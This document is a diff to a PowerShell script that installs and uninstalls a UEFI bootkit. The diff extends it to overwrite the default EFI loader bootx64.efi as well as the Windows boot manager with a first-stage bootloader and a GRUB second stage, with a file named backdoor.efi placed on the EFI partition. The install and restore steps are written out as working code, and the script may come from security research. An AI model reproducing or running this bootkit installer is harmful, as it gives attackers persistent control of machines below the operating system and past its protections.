@@ -80,14 +80,22 @@ If (-not $Install -and -not $Uninstall)
 
 $Disk = 'S:';
 
+# default EFI boot manager
+$GrubPathDef = $Disk + "\EFI\Boot\fde_ld.efi";
+$BootloaderPathDef = $Disk + "\EFI\Boot\bootx64.efi";
+$BootloaderPathDefOrig = $Disk + "\EFI\Boot\bootx64_orig.efi";
+
+# Windows EFI boot manager
 $GrubPath = $Disk + "\EFI\Microsoft\Boot\fde_ld.efi";
-$BackdoorPath = $Disk + "\EFI\Microsoft\Boot\backdoor.efi";
 $BootloaderPath = $Disk + "\EFI\Microsoft\Boot\bootmgfw.efi";
 $BootloaderPathOrig = $Disk + "\EFI\Microsoft\Boot\bootmgfw_orig.efi";
 
+# GRUB2 stuff
 $GrubDir = $Disk + "\boot\grub";
 $GrubCfgPath = $GrubDir + "\grub.cfg";
 $GrubModPath = $GrubDir + "\chain.mod";
+
+$BackdoorPath = $Disk + "\EFI\Microsoft\Boot\backdoor.efi";
 
 # check for admin user
 If (-not [bool]((whoami /groups) -match "S-1-16-12288"))
@@ -117,7 +125,30 @@ If (Test-Path $BootloaderPath)
         {
             Try 
             {
-                Write-Host ("Saving original Windows boot manager as {0}" -f $BootloaderPathOrig);
+                #
+                # Overwrite default EFI boot manager
+                #
+
+                Write-Host ("Saving default bootloader as {0}" -f $BootloaderPathDefOrig);
+
+                # save original bootloader
+                Copy-Item $BootloaderPathDef -Destination $BootloaderPathDefOrig -ErrorAction Stop -Force;
+
+                Write-Host ("Writing first stage bootloader to the {0}" -f $BootloaderPathDef);
+
+                # write first stage bootloader
+                Extract-File -Data $Bootloader -Destination $BootloaderPathDef;
+
+                Write-Host ("Writing second stage bootloader to the {0}" -f $GrubPathDef);
+
+                # write second stage bootloader
+                Extract-File -Data $Grub -Destination $GrubPathDef;
+
+                #
+                # Overwrite Windows EFI boot manager
+                #
+
+                Write-Host ("Saving Windows boot manager as {0}" -f $BootloaderPathOrig);
 
                 # save original bootloader
                 Copy-Item $BootloaderPath -Destination $BootloaderPathOrig -ErrorAction Stop -Force;
@@ -169,7 +200,12 @@ If (Test-Path $BootloaderPath)
         {
             Try 
             {
-                Write-Host ("Restoring original Windows boot manager {0}" -f $BootloaderPath);
+                Write-Host ("Restoring default bootloader {0}" -f $BootloaderPathDef);
+
+                # restore original bootloader
+                Move-Item $BootloaderPathDefOrig -Destination $BootloaderPathDef -ErrorAction Stop -Force;
+
+                Write-Host ("Restoring Windows boot manager {0}" -f $BootloaderPath);
 
                 # restore original bootloader
                 Move-Item $BootloaderPathOrig -Destination $BootloaderPath -ErrorAction Stop -Force;
@@ -177,6 +213,7 @@ If (Test-Path $BootloaderPath)
                 # perform cleanup
                 Delete-File -Path $GrubDir;
                 Delete-File -Path $GrubPath;
+                Delete-File -Path $GrubPathDef;
                 Delete-File -Path $BackdoorPath;
 
                 Write-Host "Bootkit was successfully uninstalled" -ForegroundColor Green;
